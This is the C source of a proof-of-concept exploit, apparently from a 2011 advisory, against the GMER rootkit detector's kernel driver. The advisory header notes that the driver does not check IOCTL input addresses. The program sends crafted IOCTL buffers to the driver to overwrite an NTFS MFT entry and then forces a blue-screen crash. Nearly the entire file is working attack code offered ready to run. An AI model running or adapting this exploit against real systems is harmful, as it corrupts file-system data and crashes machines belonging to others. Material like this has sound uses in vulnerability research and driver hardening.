#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>
 
/*
Program          : GMER (1.0.15.15641)
Homepage         : http://www.gmer.net
Discovery        : 2011/08/01
Author Contacted : 2011/08/09
Status of vuln   : 0day
Found by         : Heurs
This Advisory    : Heurs
Contact          : sleberre@nes.fr
 
 

//----- Application description

GMER is an application that detects and removes rootkits without virus hash.

//----- Description of vulnerability

GMER don't check all inputs addresses of an IOCTL.

//----- Credits
 
http://www.nes.fr
http://ghostsinthestack.org
 
sleberre at nes dot fr
heurs at ghostsinthestack dot org

Twitter : @NES_SecurityLab
          @Heurs

*/

int __cdecl main(int argc, char* argv[])
{
    HANDLE hDevice = (HANDLE) 0xffffffff;
    HANDLE Hfile;
    DWORD NombreByte;
    char CurrName[255];
    int SzCurrName = sizeof(CurrName);
    char NameOfDevice[255];
    HKEY hKey;
    DWORD Crashing[161] = {
0x00000084, 0x00000000, 0x00000004, 0x00000000, // 0x4 allow to overwrite a buffer with our own binaries datas
0xc0007000, 0x00000000, 0x00000084, 0x00000200,  // 0x80000000 provide an integer overflow and set a userland pointer
0x00000052, 0x0044005c, 0x00760065, 0x00630069,
0x005c0065, 0x00630053, 0x00690073, 0x0076005c,
0x0073006d, 0x00730063, 0x00310069, 0x006f0050,
0x00740072, 0x00500032, 0x00740061, 0x00300068,
0x00610054, 0x00670072, 0x00740065, 0x004c0030,
0x006e0075, 0x00000030, 0x00000000, 0x00000000,
0x00000000
        };
    char out[0x1fe00];
    unsigned int BadDWORD;
    DWORD Buffer,Buffer2;
    int i;
    
    printf("Gmer 1.0.15.15641 0day (NTFS - MFT Entry overwrite)\n\n");
    
    strcpy((char*)Crashing+132,"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Cras fringilla tortor ac purus sodales egestas. Sed nec tortor convallis nulla gravida blandit at ut erat. Nulla ac tortor purus. Sed aliquam est id metus dignissim vel blandit arcu vulputate. Praesent ut mi tellus, ut volutpat tellus. Maecenas euismod ligula vitae diam ultricies sit amet consequat massa interdum. Sed laoreet mauris sed diam faucibus et cursus risus sagittis. Proin purus elit, suscipit ac mollis ac, bibendum ut sem. Quisque cras amet.");
    
    RegOpenKeyEx( HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services",0,KEY_QUERY_VALUE|KEY_READ,&hKey);
    
    while (RegEnumKeyEx(hKey, i, CurrName, (void*)&SzCurrName, 0, 0, 0, 0) == ERROR_SUCCESS){
        if (strlen(CurrName)==8) {
            strcpy(NameOfDevice, "\\\\.\\");
            strcat(NameOfDevice, CurrName);
            
            hDevice = CreateFile("\\\\.\\pfndrpob",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
            
            printf("...");
            DeviceIoControl(hDevice,0x7201c008,Crashing,sizeof(Crashing),out,sizeof(out),&NombreByte,NULL);
            //printf("Sploit Send.\nhDeviceIoControl(0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,NULL);\n",hDevice,0x7201c008,Crashing,sizeof(Crashing),out,sizeof(out),&NombreByte);
            printf("MFT entry is p0wn3d by Lorem ipsum !\n");
            printf("Send BSOD in 5sc.");
            Sleep(1000);
            printf(".");
            Sleep(1000);
            printf(".");
            Sleep(1000);
            printf(".");
            Sleep(1000);
            printf(".");
            Sleep(1000);
            Crashing[7] = 0x02ffffff;
            DeviceIoControl(hDevice,0x7201c008,Crashing,sizeof(Crashing),out,sizeof(out),&NombreByte,NULL);
            CloseHandle(hDevice);
        }
    }
    getch();
    return 0;
}
